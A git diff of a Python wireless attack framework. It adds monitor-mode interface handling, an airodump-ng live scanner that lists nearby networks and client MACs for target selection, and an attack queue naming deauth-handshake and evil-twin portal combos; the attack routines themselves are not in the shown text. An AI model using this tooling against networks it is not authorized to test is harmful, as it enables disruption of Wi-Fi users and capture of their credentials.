@@ -1,5 +1,5 @@
 # =============================================================================
-# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
+# VAPT Toolkit - Wireless Attack Framework
 # =============================================================================
 #
 # Author: Keith Pachulski
@@ -10,27 +10,12 @@
 # Copyright (c) 2025 Keith Pachulski. All rights reserved.
 #
 # License: This software is licensed under the MIT License.
-#          You are free to use, modify, and distribute this software
-#          in accordance with the terms of the license.
 #
-# Purpose: This script provides an automated installation and management system
-#          for a vulnerability assessment and penetration testing
-#          toolkit. It installs and configures security tools across multiple
-#          categories including exploitation, web testing, network scanning,
-#          mobile security, cloud security, and Active Directory testing.
-#
-# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
-#             express or implied, including but not limited to the warranties
-#             of merchantability, fitness for a particular purpose, and non-infringement.
-#             In no event shall the authors or copyright holders be liable for any claim,
-#             damages, or other liability, whether in an action of contract, tort, or otherwise,
-#             arising from, out of, or in connection with the software or the use or other dealings
-#             in the software.
+# DISCLAIMER: This software is provided "as-is," without warranty of any kind.
 #
 # NOTICE: This toolkit is intended for authorized security testing only.
-#         Users are responsible for ensuring compliance with all applicable laws
-#         and regulations. Unauthorized use of these tools may violate local,
-#         state, federal, and international laws.
+#         Users are responsible for ensuring compliance with all applicable
+#         laws and regulations.
 #
 # =============================================================================
 
@@ -41,1962 +26,2070 @@ import re
 import json
 import time
 import glob
+import curses
+import tempfile
+import threading
+import http.server
+import socketserver
+import shutil
+from collections import deque
 from pathlib import Path
 from datetime import datetime
+from urllib.parse import parse_qs
 from bs4 import BeautifulSoup
 
-class WirelessAttackFramework:
-    def __init__(self):
-        self.config_file = Path.cwd() / 'wireless_attack_config.json'
-        self.tool_paths = {}
-        self.selected_interface = None
-        self.target_network = None
-        self.discovered_networks = []
-        self.load_config()
-        self.check_tools()
+# =============================================================================
+# ProcessRegistry - Centralized subprocess tracking
+# =============================================================================
 
-    def load_config(self):
-        """Load tool paths from config"""
+class ProcessRegistry:
+    """Centralized registry for all spawned subprocesses."""
+
+    def __init__(self):
+        self._processes = {}
+        self._lock = threading.Lock()
+
+    def register(self, name: str, proc: subprocess.Popen):
+        with self._lock:
+            self._processes[name] = proc
+
+    def terminate(self, name: str, timeout: int = 5):
+        with self._lock:
+            proc = self._processes.pop(name, None)
+        if proc:
+            try:
+                proc.terminate()
+                proc.wait(timeout=timeout)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+            except Exception:
+                pass
+
+    def terminate_all(self):
+        with self._lock:
+            names = list(self._processes.keys())
+        for name in names:
+            self.terminate(name)
+
+    def is_running(self, name: str) -> bool:
+        with self._lock:
+            proc = self._processes.get(name)
+        if proc is None:
+            return False
+        return proc.poll() is None
+
+    def kill_by_name(self, binary_name: str):
+        """Kill all system processes matching a binary name."""
+        subprocess.run(['sudo', 'pkill', '-9', binary_name],
+                       capture_output=True)
+
+
+# =============================================================================
+# InterfaceManager - Monitor mode, channel management, capability detection
+# =============================================================================
+
+class InterfaceManager:
+    """Manages wireless interface state transitions and capabilities."""
+
+    def __init__(self):
+        # Primary interface - scanning and capture
+        self.physical_interface  = None     # e.g. wlan0
+        self.monitor_interface   = None     # e.g. wlan0mon
+        self.supports_5ghz       = False
+
+        # Secondary interface - transmit / attack frames
+        self.physical_interface_2 = None   # e.g. wlan1
+        self.monitor_interface_2  = None   # e.g. wlan1mon
+        self.supports_5ghz_2      = False
+
+    @property
+    def dual_interface(self) -> bool:
+        """True when both monitor interfaces are ready."""
+        return bool(self.monitor_interface and self.monitor_interface_2)
+
+    @property
+    def attack_interface(self) -> str | None:
+        """
+        Interface for transmitting attack frames.
+        Prefers the secondary so the primary stays dedicated to capture.
+        Falls back to primary when only one adapter is present.
+        """
+        return self.monitor_interface_2 or self.monitor_interface
+
+    @property
+    def capture_interface(self) -> str | None:
+        """Primary interface dedicated to passive listening/capture."""
+        return self.monitor_interface
+
+    def get_all_wireless_interfaces(self) -> list:
+        """Return all wireless interfaces present in /sys/class/net."""
+        interfaces = []
+        net_path = Path('/sys/class/net')
+        if net_path.exists():
+            for iface_dir in net_path.iterdir():
+                if (iface_dir / 'wireless').exists():
+                    interfaces.append(iface_dir.name)
+        return sorted(set(interfaces))
+
+    def get_available_interfaces(self) -> list:
+        """Return wireless interfaces not currently in active use."""
+        available = []
+        for iface in self.get_all_wireless_interfaces():
+            try:
+                result = subprocess.run(
+                    ['sudo', 'iwconfig', iface],
+                    capture_output=True, text=True
+                )
+                output = result.stderr + result.stdout
+
+                ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+                in_use = iface in ps_result.stdout
+
+                if 'Mode:Monitor' in output:
+                    if not in_use:
+                        available.append(iface)
+                elif any(x in output for x in [
+                    'Not-Associated', 'ESSID:off/any', 'ESSID:""',
+                    'Access Point: Not-Associated'
+                ]):
+                    available.append(iface)
+            except Exception:
+                available.append(iface)
+
+        return available
+
+    def probe_5ghz_support(self, interface: str) -> bool:
+        """Check whether the physical adapter supports 5GHz bands."""
+        try:
+            # Get phy name for this interface
+            phy_path = Path(f'/sys/class/net/{interface}/phy80211/name')
+            if phy_path.exists():
+                phy = phy_path.read_text().strip()
+            else:
+                phy = 'phy0'
+
+            result = subprocess.run(
+                ['sudo', 'iw', phy, 'info'],
+                capture_output=True, text=True
+            )
+            # 5GHz bands show up as "Band 2" or frequencies > 4900 MHz
+            return any(x in result.stdout for x in [
+                '5180 MHz', '5200 MHz', '5220 MHz', 'Band 2', '5 GHz'
+            ])
+        except Exception:
+            return False
+
+    def enable_monitor_mode(self, interface: str) -> str | None:
+        """
+        Put interface into monitor mode using airmon-ng.
+        Returns the resulting monitor interface name, or None on failure.
+        """
+        # Kill interfering processes first
+        print(f"\nKilling interfering processes...")
+        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
+                       capture_output=True)
+        time.sleep(1)
+
+        # Snapshot interfaces before to detect the new monitor iface
+        before = set(self.get_all_wireless_interfaces())
+
+        print(f"Enabling monitor mode on {interface}...")
+        result = subprocess.run(
+            ['sudo', 'airmon-ng', 'start', interface],
+            capture_output=True, text=True
+        )
+
+        time.sleep(2)
+
+        # Try to parse "monitor mode enabled on X" from airmon output
+        match = re.search(
+            r'monitor mode (?:vif )?enabled (?:for .+? )?on (\w+)',
+            result.stdout + result.stderr,
+            re.IGNORECASE
+        )
+        if match:
+            mon_iface = match.group(1)
+            self.physical_interface = interface
+            self.monitor_interface = mon_iface
+            self.supports_5ghz = self.probe_5ghz_support(interface)
+            print(f"Monitor interface: {mon_iface}")
+            if self.supports_5ghz:
+                print("5GHz support detected.")
+            else:
+                print("Warning: 5GHz not supported on this adapter - 2.4GHz only.")
+            return mon_iface
+
+        # Fallback: diff interface list
+        after = set(self.get_all_wireless_interfaces())
+        new_ifaces = after - before
+        if new_ifaces:
+            mon_iface = new_ifaces.pop()
+            self.physical_interface = interface
+            self.monitor_interface = mon_iface
+            self.supports_5ghz = self.probe_5ghz_support(interface)
+            print(f"Monitor interface (auto-detected): {mon_iface}")
+            return mon_iface
+
+        # Last fallback: check if original interface is now in monitor mode
+        check = subprocess.run(
+            ['sudo', 'iwconfig', interface],
+            capture_output=True, text=True
+        )
+        if 'Mode:Monitor' in (check.stdout + check.stderr):
+            self.physical_interface = interface
+            self.monitor_interface = interface
+            self.supports_5ghz = self.probe_5ghz_support(interface)
+            return interface
+
+        print("Failed to enable monitor mode.")
+        return None
+
+    def enable_monitor_mode_2(self, interface: str) -> str | None:
+        """
+        Put the second interface into monitor mode.
+        Does NOT run airmon-ng check kill — the primary is already running.
+        """
+        before = set(self.get_all_wireless_interfaces())
+
+        print(f"Enabling monitor mode on {interface} (attack interface)...")
+        result = subprocess.run(
+            ['sudo', 'airmon-ng', 'start', interface],
+            capture_output=True, text=True
+        )
+        time.sleep(2)
+
+        match = re.search(
+            r'monitor mode (?:vif )?enabled (?:for .+? )?on (\w+)',
+            result.stdout + result.stderr,
+            re.IGNORECASE
+        )
+        if match:
+            mon_iface = match.group(1)
+            self.physical_interface_2 = interface
+            self.monitor_interface_2  = mon_iface
+            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
+            print(f"Attack interface: {mon_iface}"
+                  + (" [5GHz]" if self.supports_5ghz_2 else " [2.4GHz]"))
+            return mon_iface
+
+        after      = set(self.get_all_wireless_interfaces())
+        new_ifaces = after - before
+        # Exclude the primary monitor interface from candidates
+        new_ifaces.discard(self.monitor_interface)
+        if new_ifaces:
+            mon_iface = new_ifaces.pop()
+            self.physical_interface_2 = interface
+            self.monitor_interface_2  = mon_iface
+            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
+            print(f"Attack interface (auto-detected): {mon_iface}")
+            return mon_iface
+
+        check = subprocess.run(
+            ['sudo', 'iwconfig', interface],
+            capture_output=True, text=True
+        )
+        if 'Mode:Monitor' in (check.stdout + check.stderr):
+            self.physical_interface_2 = interface
+            self.monitor_interface_2  = interface
+            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
+            return interface
+
+        print(f"Failed to enable monitor mode on {interface}.")
+        return None
+
+    def disable_monitor_mode(self):
+        """Restore both interfaces to managed mode."""
+        for mon, phys in [
+            (self.monitor_interface,   self.physical_interface),
+            (self.monitor_interface_2, self.physical_interface_2),
+        ]:
+            if not mon:
+                continue
+            print(f"Restoring {mon} to managed mode...")
+            subprocess.run(['sudo', 'airmon-ng', 'stop', mon],
+                           capture_output=True)
+            time.sleep(1)
+            target = phys or mon
+            check = subprocess.run(
+                ['sudo', 'iwconfig', target],
+                capture_output=True, text=True
+            )
+            if 'Mode:Monitor' in (check.stdout + check.stderr):
+                subprocess.run(['sudo', 'ip', 'link', 'set', target, 'down'],
+                               capture_output=True)
+                subprocess.run(['sudo', 'iwconfig', target, 'mode', 'managed'],
+                               capture_output=True)
+                subprocess.run(['sudo', 'ip', 'link', 'set', target, 'up'],
+                               capture_output=True)
+
+        self.monitor_interface   = None
+        self.monitor_interface_2 = None
+
+        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
+                       capture_output=True)
+        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
+                       capture_output=True)
+
+    def set_channel(self, interface: str, channel: str):
+        """Set interface to a specific channel."""
+        channel = channel.strip()
+        try:
+            subprocess.run(
+                ['sudo', 'iwconfig', interface, 'channel', channel],
+                check=True, capture_output=True
+            )
+        except subprocess.CalledProcessError:
+            # Try iw as fallback
+            subprocess.run(
+                ['sudo', 'iw', 'dev', interface, 'set', 'channel', channel],
+                capture_output=True
+            )
+
+    def connect_to_network(self, interface: str, ssid: str) -> bool:
+        """Connect interface to a network via NetworkManager."""
+        try:
+            result = subprocess.run(
+                ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
+                 'ifname', interface],
+                capture_output=True, text=True, timeout=30
+            )
+            if result.returncode != 0:
+                return False
+            time.sleep(2)
+            check = subprocess.run(
+                ['ip', 'addr', 'show', interface],
+                capture_output=True, text=True
+            )
+            return 'inet ' in check.stdout
+        except Exception:
+            return False
+
+    def disconnect_from_network(self, interface: str):
+        """Disconnect interface via NetworkManager."""
+        subprocess.run(
+            ['sudo', 'nmcli', 'device', 'disconnect', interface],
+            capture_output=True, timeout=10
+        )
+        time.sleep(1)
+
+
+# =============================================================================
+# ScanEngine - Live airodump scanning with curses display
+# Single-threaded select()-based event loop. No threads, no locks, no GIL
+# contention. Input is handled every SELECT_TIMEOUT seconds regardless of
+# whether a CSV parse is happening. Parsing only fires when airodump has
+# actually written new data (mtime changed), so CPU usage is minimal.
+# =============================================================================
+
+class ScanEngine:
+
+    SIGNAL_HISTORY_LEN = 5   # readings for rolling average
+    SELECT_TIMEOUT     = 0.05 # seconds - input poll interval (50ms)
+    PARSE_INTERVAL     = 2.0  # seconds - minimum time between CSV parses
+
+    def __init__(self, monitor_interface: str, temp_dir: Path,
+                 supports_5ghz: bool = False):
+        self.monitor_interface = monitor_interface
+        self.temp_dir          = temp_dir
+        self.supports_5ghz     = supports_5ghz
+        self.scan_prefix       = str(temp_dir / 'scan')
+
+        # These are only ever touched by the main thread - no locks needed
+        self.networks:         list[dict]            = []
+        self.clients_by_bssid: dict[str, list[str]]  = {}
+        self._signal_history:  dict[str, deque]      = {}
+
+        self._airodump_proc:   subprocess.Popen | None = None
+        self._last_mtime:      float = 0.0
+        self._last_parse_time: float = 0.0
+
+    # ------------------------------------------------------------------
+    # airodump lifecycle
+    # ------------------------------------------------------------------
+
+    def _start_airodump(self):
+        band_arg = 'abg' if self.supports_5ghz else 'bg'
+        cmd = [
+            'sudo', 'airodump-ng',
+            '--band', band_arg,
+            '--write', self.scan_prefix,
+            '--output-format', 'csv',
+            '--write-interval', '1',
+            self.monitor_interface,
+        ]
+        self._airodump_proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+    def _stop_airodump(self):
+        if self._airodump_proc:
+            try:
+                self._airodump_proc.terminate()
+                self._airodump_proc.wait(timeout=5)
+            except Exception:
+                try:
+                    self._airodump_proc.kill()
+                    self._airodump_proc.wait(timeout=2)
+                except Exception:
+                    pass
+            self._airodump_proc = None
+
+    # ------------------------------------------------------------------
+    # CSV parsing - called only from the main thread
+    # ------------------------------------------------------------------
+
+    def _find_csv(self) -> Path | None:
+        """Return the most recently modified scan CSV, or None."""
+        csv_files = sorted(
+            self.temp_dir.glob('scan-*.csv'),
+            key=lambda p: p.stat().st_mtime,
+            reverse=True,
+        )
+        return csv_files[0] if csv_files else None
+
+    def _parse_if_stale(self):
+        """
+        Re-parse the CSV only if:
+          - enough time has passed since the last parse, AND
+          - the file mtime has changed (airodump wrote new data)
+        This keeps the main thread free for input the vast majority
+        of the time.
+        """
+        now = time.monotonic()
+        if now - self._last_parse_time < self.PARSE_INTERVAL:
+            return
+
+        csv_path = self._find_csv()
+        if not csv_path:
+            return
+
+        try:
+            mtime = csv_path.stat().st_mtime
+        except OSError:
+            return
+
+        if mtime == self._last_mtime:
+            return  # file unchanged, skip
+
+        try:
+            content = csv_path.read_text(encoding='utf-8', errors='ignore')
+        except OSError:
+            return
+
+        self._last_mtime      = mtime
+        self._last_parse_time = now
+        self._parse_content(content)
+
+    def _parse_content(self, content: str):
+        """Parse raw CSV text and update self.networks / self.clients_by_bssid."""
+        networks:         list[dict]           = []
+        clients_by_bssid: dict[str, list[str]] = {}
+
+        in_ap            = True
+        in_station       = False
+        ap_header_found  = False
+
+        for raw_line in content.split('\n'):
+            line = raw_line.strip()
+            if not line:
+                continue
+
+            if 'Station MAC' in line:
+                in_ap      = False
+                in_station = True
+                continue
+
+            if in_ap:
+                if 'BSSID' in line and 'ESSID' in line:
+                    ap_header_found = True
+                    continue
+                if not ap_header_found:
+                    continue
+
+                fields = [f.strip() for f in line.split(',')]
+                if len(fields) < 14:
+                    continue
+
+                bssid   = fields[0]
+                channel = fields[3]
+                privacy = fields[5]
+                power   = fields[8]
+                essid   = fields[13] if fields[13] else '[Hidden]'
+
+                if ':' not in bssid or len(bssid) < 17:
+                    continue
+
+                try:
+                    pwr_int = int(power)
+                except ValueError:
+                    pwr_int = -100
+
+                # Rolling signal average
+                if bssid not in self._signal_history:
+                    self._signal_history[bssid] = deque(maxlen=self.SIGNAL_HISTORY_LEN)
+                self._signal_history[bssid].append(pwr_int)
+                avg = int(sum(self._signal_history[bssid]) /
+                          len(self._signal_history[bssid]))
+
+                networks.append({
+                    'bssid':     bssid,
+                    'essid':     essid,
+                    'channel':   channel,
+                    'privacy':   privacy,
+                    'power':     str(pwr_int),
+                    'avg_power': avg,
+                })
+
+            elif in_station:
+                fields = [f.strip() for f in line.split(',')]
+                if len(fields) < 6:
+                    continue
+                station_mac = fields[0]
+                bssid       = fields[5]
+                if (
+                    ':' in station_mac and
+                    ':' in bssid and
+                    'not associated' not in bssid.lower()
+                ):
+                    clients_by_bssid.setdefault(bssid, [])
+                    if station_mac not in clients_by_bssid[bssid]:
+                        clients_by_bssid[bssid].append(station_mac)
+
+        self.networks         = networks
+        self.clients_by_bssid = clients_by_bssid
+
+    def get_snapshot(self):
+        """Return current scan data. Safe to call from main thread only."""
+        return self.networks, self.clients_by_bssid
+
+    # ------------------------------------------------------------------
+    # Curses display - single-threaded select() event loop
+    # ------------------------------------------------------------------
+
+    def run_display(self) -> list[dict]:
+        """
+        Launch airodump and the curses UI.
+        Blocks until the user confirms a selection or quits.
+        Returns a list of selected target dicts.
+        """
+        self._start_airodump()
+        try:
+            return curses.wrapper(self._curses_main)
+        finally:
+            self._stop_airodump()
+
+    def _draw_screen(self, stdscr, networks, clients,
+                     cursor_pos, selected_indices):
+        """Redraw the full screen. Called only when state has changed."""
+        height, width = stdscr.getmaxyx()
+
+        # Reserve 3 rows at top (title + header + divider)
+        # Reserve 3 rows at bottom (status + help + spare)
+        table_rows = max(1, height - 6)
+
+        stdscr.erase()
+
+        # ---- Title bar ----
+        band  = "[2.4GHz + 5GHz]" if self.supports_5ghz else "[2.4GHz]"
+        title = f" RCS Wireless Attack Framework - Live Scan  {band} "
+        stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        stdscr.addstr(0, 0, title[:width - 1])
+        stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+        # ---- Column header ----
+        hdr = (f"{'#':<4}{'BSSID':<19}{'ESSID':<26}"
+               f"{'CH':<5}{'PWR':<7}{'ENC':<11}{'CLI'}")
+        stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        stdscr.addstr(1, 0, hdr[:width - 1])
+        stdscr.addstr(2, 0, ('─' * min(width - 1, 78)))
+        stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+        # ---- Scrolling viewport ----
+        # Keep cursor centred in the viewport
+        half       = table_rows // 2
+        view_start = max(0, min(cursor_pos - half,
+                                len(networks) - table_rows))
+        view_start = max(0, view_start)
+
+        for row in range(table_rows):
+            net_idx = view_start + row
+            y       = 3 + row
+            if y >= height - 3 or net_idx >= len(networks):
+                break
+
+            net          = networks[net_idx]
+            client_count = len(clients.get(net['bssid'], []))
+            marker       = '*' if net_idx in selected_indices else ' '
+
+            line = (
+                f"{marker}{net_idx + 1:<3}"
+                f"{net['bssid']:<19}"
+                f"{net['essid'][:25]:<26}"
+                f"{net['channel']:<5}"
+                f"{net['avg_power']:<7}"
+                f"{net['privacy']:<11}"
+                f"{client_count}"
+            )
+
+            if net_idx == cursor_pos:
+                attr = curses.color_pair(2) | curses.A_BOLD | curses.A_REVERSE
+            elif net_idx in selected_indices:
+                attr = curses.color_pair(3) | curses.A_BOLD
+            else:
+                attr = curses.color_pair(5)
+
+            try:
+                stdscr.attron(attr)
+                stdscr.addstr(y, 0, line[:width - 1])
+                stdscr.attroff(attr)
+            except curses.error:
+                pass  # addstr at last cell on some terminals
+
+        # ---- Status bar ----
+        total_clients = sum(len(v) for v in clients.values())
+        status = (f" Networks: {len(networks)}"
+                  f"  Clients: {total_clients}"
+                  f"  Selected: {len(selected_indices)}"
+                  f"  Row {cursor_pos + 1}/{max(1, len(networks))} ")
+        sy = height - 3
+        if 0 <= sy < height:
+            stdscr.attron(curses.color_pair(4) | curses.A_BOLD)
+            stdscr.addstr(sy, 0, status[:width - 1])
+            stdscr.attroff(curses.color_pair(4) | curses.A_BOLD)
+
+        # ---- Help line ----
+        help_line = (" UP/DOWN: move  SPACE: select  ENTER: confirm"
+                     "  A: all  C: clear  Q: quit")
+        hy = height - 2
+        if 0 <= hy < height:
+            stdscr.attron(curses.color_pair(1))
+            stdscr.addstr(hy, 0, help_line[:width - 1])
+            stdscr.attroff(curses.color_pair(1))
+
+        stdscr.refresh()
+
+    def _curses_main(self, stdscr) -> list[dict]:
+        curses.curs_set(0)
+        curses.start_color()
+        curses.use_default_colors()
+        stdscr.keypad(True)
+        # timeout(50): getch() returns -1 after 50ms if no key pressed.
+        # This is the correct curses-native non-blocking pattern.
+        # select() on sys.stdin does NOT work when curses owns the terminal
+        # in raw mode - it blocks indefinitely regardless of keypresses.
+        stdscr.timeout(50)
+
+        curses.init_pair(1, curses.COLOR_GREEN,  -1)
+        curses.init_pair(2, curses.COLOR_CYAN,   -1)
+        curses.init_pair(3, curses.COLOR_YELLOW, -1)
+        curses.init_pair(4, curses.COLOR_BLACK,  curses.COLOR_GREEN)
+        curses.init_pair(5, curses.COLOR_WHITE,  -1)
+
+        selected_indices: set[int] = set()
+        cursor_pos  = 0
+        need_redraw = True
+        networks:   list[dict] = []
+        clients:    dict       = {}
+
+        while True:
+            # getch() either returns a key immediately or -1 after 50ms
+            key = stdscr.getch()
+
+            if key == -1:
+                # No keypress - use this idle tick to check for new CSV data
+                old_count = len(networks)
+                self._parse_if_stale()
+                networks, clients = self.get_snapshot()
+                # Filter hidden networks until they decloak
+                networks = [n for n in networks if n['essid'] != '[Hidden]']
+                if len(networks) != old_count:
+                    need_redraw = True
+                if networks:
+                    cursor_pos = min(cursor_pos, len(networks) - 1)
+                else:
+                    cursor_pos = 0
+            else:
+                # Key arrived - handle it immediately, no CSV check this tick
+                prev_cursor = cursor_pos
+
+                if key == curses.KEY_UP:
+                    cursor_pos = max(0, cursor_pos - 1)
+                elif key == curses.KEY_DOWN:
+                    if networks:
+                        cursor_pos = min(len(networks) - 1, cursor_pos + 1)
+                elif key == curses.KEY_PPAGE:
+                    cursor_pos = max(0, cursor_pos - 10)
+                elif key == curses.KEY_NPAGE:
+                    if networks:
+                        cursor_pos = min(len(networks) - 1, cursor_pos + 10)
+                elif key == curses.KEY_HOME:
+                    cursor_pos = 0
+                elif key == curses.KEY_END:
+                    cursor_pos = max(0, len(networks) - 1)
+                elif key == ord(' '):
+                    if cursor_pos < len(networks):
+                        if cursor_pos in selected_indices:
+                            selected_indices.discard(cursor_pos)
+                        else:
+                            selected_indices.add(cursor_pos)
+                elif key in (curses.KEY_ENTER, ord('\n'), ord('\r')):
+                    if selected_indices:
+                        return [networks[i] for i in sorted(selected_indices)
+                                if i < len(networks)]
+                    elif cursor_pos < len(networks):
+                        return [networks[cursor_pos]]
+                elif key in (ord('a'), ord('A')):
+                    selected_indices = set(range(len(networks)))
+                elif key in (ord('c'), ord('C')):
+                    selected_indices.clear()
+                elif key in (ord('q'), ord('Q')):
+                    return []
+
+                if cursor_pos != prev_cursor or key in (
+                    ord(' '), ord('a'), ord('A'), ord('c'), ord('C')
+                ):
+                    need_redraw = True
+
+            if need_redraw:
+                self._draw_screen(stdscr, networks, clients,
+                                  cursor_pos, selected_indices)
+                need_redraw = False
+
+
+# =============================================================================
+# AttackQueue - Sequential execution with predefined concurrent combos
+# =============================================================================
+
+class AttackQueue:
+    """Manages sequential attack execution with combo attack support."""
+
+    COMBO_PAIRS = {
+        'deauth_handshake',
+        'evil_twin_portal',
+    }
+
+    def __init__(self):
+        self._queue: list[dict] = []
+
+    def add(self, target: dict, attack_type: str, params: dict | None = None):
+        self._queue.append({
+            'target':      target,
+            'attack_type': attack_type,
+            'params':      params or {},
+        })
+
+    def clear(self):
+        self._queue.clear()
+
+    def display(self):
+        if not self._queue:
+            print("\n  (queue is empty)")
+            return
+        print(f"\n{'#':<3} {'TARGET ESSID':<25} {'ATTACK':<25}")
+        print('-' * 55)
+        for i, item in enumerate(self._queue, 1):
+            print(f"{i:<3} {item['target']['essid'][:24]:<25} {item['attack_type']:<25}")
+
+    def __len__(self):
+        return len(self._queue)
+
+    def __iter__(self):
+        return iter(self._queue)
+
+
+# =============================================================================
+# WirelessAttackFramework - Main orchestrator
+# =============================================================================
+
+class WirelessAttackFramework:
+
+    def __init__(self):
+        self.registry    = ProcessRegistry()
+        self.iface_mgr   = InterfaceManager()
+        self.scan_engine: ScanEngine | None = None
+        self.attack_queue = AttackQueue()
+
+        self.temp_dir: Path = Path(
+            tempfile.mkdtemp(prefix='waf_',
+                             dir='/tmp',
+                             )
+        )
+        self.config_file = Path.cwd() / 'wireless_attack_config.json'
+        self.tool_paths: dict[str, str] = {}
+        self.selected_targets: list[dict] = []
+
+        self._load_config()
+        self._check_tools()
+
+    # ------------------------------------------------------------------
+    # Config
+    # ------------------------------------------------------------------
+
+    def _load_config(self):
         if self.config_file.exists():
             try:
                 with open(self.config_file, 'r') as f:
                     config = json.load(f)
                     self.tool_paths = config.get('tool_paths', {})
-            except:
+            except Exception:
                 self.tool_paths = {}
 
-    def save_config(self):
-        """Save tool paths to config"""
-        config = {'tool_paths': self.tool_paths, 'last_updated': datetime.now().isoformat()}
+    def _save_config(self):
+        config = {
+            'tool_paths':    self.tool_paths,
+            'last_updated':  datetime.now().isoformat(),
+        }
         with open(self.config_file, 'w') as f:
             json.dump(config, f, indent=2)
 
-    def find_tool(self, tool_name):
-        """Find tool path using which command"""
+    def _find_tool(self, name: str) -> str | None:
         try:
-            result = subprocess.run(['which', tool_name], capture_output=True, text=True, check=True)
+            result = subprocess.run(
+                ['which', name], capture_output=True, text=True, check=True
+            )
             return result.stdout.strip()
-        except:
+        except Exception:
             return None
 
-    def check_tools(self):
-        """Verify required tools are available"""
-        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
-                         'mdk3', 'hostapd', 'dnsmasq', 'iptables']
-
+    def _check_tools(self):
+        required = [
+            'airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
+            'aircrack-ng', 'mdk3', 'hostapd', 'dnsmasq', 'iptables',
+            'nmcli', 'wget',
+        ]
         missing = []
-        for tool in required_tools:
-            if tool not in self.tool_paths or not Path(self.tool_paths[tool]).exists():
-                path = self.find_tool(tool)
-                if path:
-                    self.tool_paths[tool] = path
+        for tool in required:
+            path = self.tool_paths.get(tool)
+            if not path or not Path(path).exists():
+                found = self._find_tool(tool)
+                if found:
+                    self.tool_paths[tool] = found
                 else:
                     missing.append(tool)
 
         if self.tool_paths:
-            self.save_config()
+            self._save_config()
 
         if missing:
-            print(f"Warning: Missing tools: {', '.join(missing)}")
+            print(f"\nWarning: Missing tools: {', '.join(missing)}")
             print("Some attacks may not be available.")
 
-    def get_available_interfaces(self):
-        """Get wireless interfaces not currently in use"""
-        interfaces = []
+    def _require_tool(self, name: str) -> str | None:
+        path = self.tool_paths.get(name)
+        if not path:
+            print(f"\nRequired tool '{name}' not found. Install it and restart.")
+            input("Press Enter to continue...")
+        return path
 
-        # Check /sys/class/net for all wireless interfaces
-        net_path = Path('/sys/class/net')
-        if net_path.exists():
-            for iface_dir in net_path.iterdir():
-                if (iface_dir / 'wireless').exists():
-                    iface = iface_dir.name
+    # ------------------------------------------------------------------
+    # Startup flow
+    # ------------------------------------------------------------------
 
-                    # Check if interface is not connected to a network
-                    try:
-                        result = subprocess.run(['sudo', 'iwconfig', iface],
-                                              capture_output=True, text=True)
-                        # iwconfig outputs to stderr on some systems, stdout on others
-                        output = result.stderr + result.stdout
-
-                        # Check if actually in use by a process
-                        ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
-                        in_use_by_process = iface in ps_result.stdout
-
-                        # Interface is available if:
-                        # 1. Not associated with an AP (Not-Associated or ESSID:off/any)
-                        # 2. OR in monitor mode but not being used by a process
-                        # 3. Not connected to a network (has IP and ESSID)
-
-                        if 'Mode:Monitor' in output:
-                            # Monitor mode - check if actually in use
-                            if not in_use_by_process:
-                                interfaces.append(iface)
-                        elif ('Not-Associated' in output or
-                              'ESSID:off/any' in output or
-                              'ESSID:""' in output or
-                              'Access Point: Not-Associated' in output):
-                            # Managed mode, not connected
-                            interfaces.append(iface)
-                        # If connected (has ESSID with value), exclude it
-
-                    except Exception as e:
-                        # If we can't check, include it anyway
-                        interfaces.append(iface)
-
-        return sorted(set(interfaces))
-
-    def select_interface(self):
-        """Prompt user to select attack interface"""
-        interfaces = self.get_available_interfaces()
-
+    def _select_physical_interface(self, exclude: str = None) -> str | None:
+        """Prompt user to select a physical wireless interface."""
+        interfaces = [i for i in self.iface_mgr.get_available_interfaces()
+                      if i != exclude]
         if not interfaces:
-            print("No available wireless interfaces found!")
-            print("Ensure interfaces are not connected to networks.")
-            return False
+            print("No available wireless interfaces found.")
+            return None
 
-        print("\n" + "="*60)
+        print("\n" + "=" * 60)
         print("AVAILABLE WIRELESS INTERFACES")
-        print("="*60)
-
+        print("=" * 60)
         for i, iface in enumerate(interfaces, 1):
-            print(f"{i}. {iface}")
+            print(f"  {i}. {iface}")
 
         while True:
             try:
-                choice = input("\nSelect interface for attacks (number): ").strip()
+                choice = input("\nSelect interface (number): ").strip()
                 idx = int(choice) - 1
                 if 0 <= idx < len(interfaces):
-                    self.selected_interface = interfaces[idx]
-                    print(f"Selected: {self.selected_interface}")
-                    return True
-                else:
-                    print("Invalid selection.")
+                    return interfaces[idx]
+                print("Invalid selection.")
             except (ValueError, KeyboardInterrupt):
-                print("\nCancelled.")
-                return False
+                return None
 
-    def find_airodump_csv(self):
-        """Find most recent airodump CSV file"""
-        csv_files = glob.glob('*.csv')
-        # Filter out kismet CSV files, but keep regular CSV files
-        csv_files = [f for f in csv_files if not f.endswith('.kismet.csv') and not f.endswith('.log.csv')]
-
-        if not csv_files:
-            # Try log.csv format as fallback
-            csv_files = glob.glob('*-01.log.csv')
-
-        if not csv_files:
-            return None
-
-        # Get most recent file
-        csv_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
-        return csv_files[0]
-
-    def parse_airodump_csv(self, csv_file):
-        """Parse airodump CSV for target networks and associated clients"""
-        try:
-            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-
-            # Remove line continuations (fields that wrap to next line)
-            content = content.replace('\n ', ' ')
-
-            lines = content.split('\n')
-            networks = []
-            clients = {}  # Map of BSSID -> list of client MACs
-
-            in_ap_section = True
-            in_station_section = False
-            header_found = False
-
-            for line in lines:
-                line = line.strip()
-
-                if not line:
